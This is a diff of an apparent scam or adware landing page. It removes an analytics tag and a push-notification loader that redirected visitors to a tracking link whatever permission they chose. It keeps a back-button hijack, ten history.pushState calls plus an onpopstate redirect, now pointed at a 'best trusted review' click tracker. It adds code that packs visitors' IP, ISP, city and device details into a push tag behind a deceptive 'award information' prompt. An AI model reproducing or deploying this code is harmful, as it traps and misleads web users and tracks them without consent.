@@ -16,16 +16,7 @@
             }
         }
     </script> 
-	
-<!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-FSJ1CG9XWP"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'G-FSJ1CG9XWP');
-</script>
 </head>
 
 <body style="-webkit-font-smoothing: antialiased;min-height: 100%;margin: 0;padding: 0;background: #fff url() no-repeat 100% 100%/auto 80%;color: #fff;font-family: Arial, Helvetica, sans-serif;text-align: center" onmouseleave="checkMouse(this)">
@@ -53,42 +44,57 @@
 
     <script src="./js/custom.js" type="text/javascript"></script>
 	
-	<script>
-    var url = new URL(window.location.href);
-    var pci = url.searchParams.get('clickid');
-	var ppi = url.searchParams.get('zoneid');
-    var s = document.createElement('script');
-    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-b9071.js';
-    s.onload = function(result) {
-        switch (result) {
-            case 'onPermissionDefault':
-            window.location.replace("https://i.top10.run/click.php?key=w8tirqdzp9lylzyp8aox"+window.location.href.split("split=true",2)[1]);break;
-            case 'onPermissionAllowed':
-            window.location.replace("https://i.top10.run/click.php?key=w8tirqdzp9lylzyp8aox"+window.location.href.split("split=true",2)[1]);break;
-            case 'onPermissionDenied':
-            window.location.replace("https://i.top10.run/click.php?key=w8tirqdzp9lylzyp8aox"+window.location.href.split("split=true",2)[1]);break;
-            case 'onAlreadySubscribed':
-            window.location.replace("https://i.top10.run/click.php?key=w8tirqdzp9lylzyp8aox"+window.location.href.split("split=true",2)[1]);break;
-            case 'onNotificationUnsupported':break;
-        }
-    }
-
-    document.head.appendChild(s);
-
-	
+<script>
 	! function() {
         var t;
         try {
             for(t = 0; 10 > t; ++t) history.pushState({}, "", "");
                 onpopstate = function(t) {
                 PreventExitPop = false
-                t.state && location.replace("https://i.top10.run/click.php?key=w8tirqdzp9lylzyp8aox"+window.location.href.split("split=true",2)[1])
+                t.state && location.replace("https://tk.besttrustedreview.com/click.php?lp=1")
                 }
         } catch(o) {}
     }(); 
-	
-	//wnha1n969lvkjdd0lnr3 av offer
 </script>
+
+<script>
+// COLLECT PUSH
+var userJson = JSON.stringify({
+            device_name: getURLParameter('device_name'),
+            browser_name: getURLParameter('browser_name'),
+            language: getURLParameter('language'),
+            city: getURLParameter('city'),
+            trafficsource_name: getURLParameter('trafficsource_name'),
+            device_brand: getURLParameter('device_brand'),
+            device_model: getURLParameter('device_model'),
+            browser_version: getURLParameter('browser_version'),
+            os_name: getURLParameter('os_name'),
+            os_version: getURLParameter('os_version'),
+            country: getURLParameter('country'),
+            isp: getURLParameter('isp'),
+            ip: getURLParameter('ip'),
+            user_agent: getURLParameter('user_agent'),
+            clickid: getURLParameter('clickid'),
+			intent: getURLParameter('intent')
+        })
+
+//var pm_allowAction = function () { location.href = ''; };
+//var pm_denyAction = function () { location.href = ''; };
+var pm_tag = userJson;
+//var pm_enablePrompt = true;
+var pm_promptText = 'Please allow us to push you the award information.Thank you!';
+var pm_promptAcceptBtnText = 'OK';
+var pm_promptDenyBtnText = 'NO';
+//var pm_promptHideDeny = true;
+var pm_pid = "888888888";
+
+// var tk is require
+var imported = document.createElement('script');
+imported.src = '../pub.min.js';
+document.head.appendChild(imported);
+
+</script>
+
 </body>
 
 </html>
